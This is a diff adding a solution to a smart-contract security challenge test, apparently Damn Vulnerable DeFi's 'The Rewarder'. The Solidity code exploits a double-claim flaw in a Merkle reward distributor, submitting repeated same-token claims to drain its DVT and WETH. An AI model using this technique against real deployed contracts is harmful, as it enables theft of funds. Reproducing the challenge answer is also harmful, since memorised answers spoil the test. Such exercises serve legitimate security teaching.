@@ -148,7 +148,64 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Player is at index 188 in both distributions
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        // Load rewards to get Merkle proofs
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // The vulnerability: Line 116 transfers inputClaim.amount for EACH claim in the loop,
+        // but _setClaimed is only called when token changes or at the end.
+        // When we submit multiple claims for the SAME token consecutively,
+        // each claim transfers inputClaim.amount, but _setClaimed is called once
+        // with the accumulated amount.
+
+        uint256 dvtRemaining = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
+        uint256 wethRemaining = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
+
+        // Calculate how many times we need to claim
+        uint256 dvtClaims = dvtRemaining / PLAYER_DVT_CLAIM_AMOUNT;
+        uint256 wethClaims = wethRemaining / PLAYER_WETH_CLAIM_AMOUNT;
+
+        uint256 totalClaims = dvtClaims + wethClaims;
+        Claim[] memory claims = new Claim[](totalClaims);
+
+        uint256 idx = 0;
+        // First, add all DVT claims consecutively
+        for (uint256 i = 0; i < dvtClaims; i++) {
+            claims[idx] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+            idx++;
+        }
+
+        // Then, add all WETH claims consecutively
+        for (uint256 i = 0; i < wethClaims; i++) {
+            claims[idx] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+            idx++;
+        }
+
+        // Prepare tokens array
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        // Execute the exploit
+        distributor.claimRewards(claims, tokens);
+
+        // Transfer all tokens to recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
